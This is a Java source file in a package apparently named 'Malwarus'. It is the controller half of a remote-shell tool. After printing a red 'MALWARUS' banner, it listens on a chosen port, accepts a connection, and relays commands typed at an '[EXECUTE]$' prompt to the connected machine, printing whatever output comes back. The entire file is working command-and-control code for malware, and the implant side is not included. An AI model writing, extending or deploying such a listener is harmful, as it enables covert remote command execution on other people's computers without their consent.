package Malwarus;

import java.util.Scanner;
import java.util.ArrayList;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.PrintWriter;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;

class malwarus{
       public static void main(String[] args) throws IOException {
              final String ANSI_RESET = "\u001B[0m";
              final String ANSI_BLACK = "\u001B[30m";
              final String ANSI_RED = "\u001B[31m";
              final String ANSI_GREEN = "\u001B[32m";
              final String ANSI_YELLOW = "\u001B[33m";
              final String ANSI_BLUE = "\u001B[34m";
              final String ANSI_PURPLE = "\u001B[35m";
              final String ANSI_CYAN = "\u001B[36m";
              final String ANSI_WHITE = "\u001B[37m";

              final String ANSI_BLACK_BACKGROUND = "\u001B[40m";
              final String ANSI_RED_BACKGROUND = "\u001B[41m";
              final String ANSI_GREEN_BACKGROUND = "\u001B[42m";
              final String ANSI_YELLOW_BACKGROUND = "\u001B[43m";
              final String ANSI_BLUE_BACKGROUND = "\u001B[44m";
              final String ANSI_PURPLE_BACKGROUND = "\u001B[45m";
              final String ANSI_CYAN_BACKGROUND = "\u001B[46m";
              final String ANSI_WHITE_BACKGROUND = "\u001B[47m";

              System.out.println(ANSI_RED + "  ▌ ▄ ·.  ▄▄▄· ▄▄▌  ▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄  ▄▌.▄▄ ·");
              System.out.println(ANSI_RED + "·██ ▐███ ▐█ ▀█ ██   ██· █▌▐█▐█ ▀█ ▀▄ █·█ ██▌▐█ ▀.");
              System.out.println(ANSI_RED + "▐█ ▌▐▌▐█·▄█▀▀█ ██   ██ ▐█▐▐▌▄█▀▀█ ▐▀▀▄ █▌▐█▌▄▀▀▀█▄");
              System.out.println(ANSI_RED + "██ ██▌▐█▌▐█  ▐▌▐█▌▐▌▐█▌██▐█▌▐█  ▐▌▐█ █▌▐█▄█▌▐█▄ ▐█");
              System.out.println(ANSI_RED + "▀▀  █ ▀▀▀ ▀  ▀ .▀▀▀  ▀▀▀▀ ▀  ▀  ▀ .▀  ▀ ▀▀▀  ▀▀▀▀" + ANSI_RESET);


              Scanner scanner = new Scanner(System.in);
              System.out.print("PORT: ");
              int port = Integer.parseInt(scanner.nextLine());

              ServerSocket serverSocket = new ServerSocket(port);
              Socket socket = serverSocket.accept();

              while (!serverSocket.isClosed()){
                     BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                     PrintWriter printWriter = new PrintWriter(socket.getOutputStream());

                     System.out.print(ANSI_CYAN + "[EXECUTE]$ " + ANSI_RESET);
                     String command = scanner.nextLine();

                     printWriter.println(command);
                     printWriter.flush();

                     String line;
                     String outputData = "";

                     System.out.println(ANSI_RED+"*------------output------------*"+ANSI_RESET);
                     while ((line = bufferedReader.readLine()).equals("%") != true){
                            System.out.println(ANSI_WHITE+line+ANSI_RESET);
                            System.out.println("\n");
                     }
                     System.out.println(ANSI_RED+"*------------------------------*"+ANSI_RESET);
              } 
       }
}
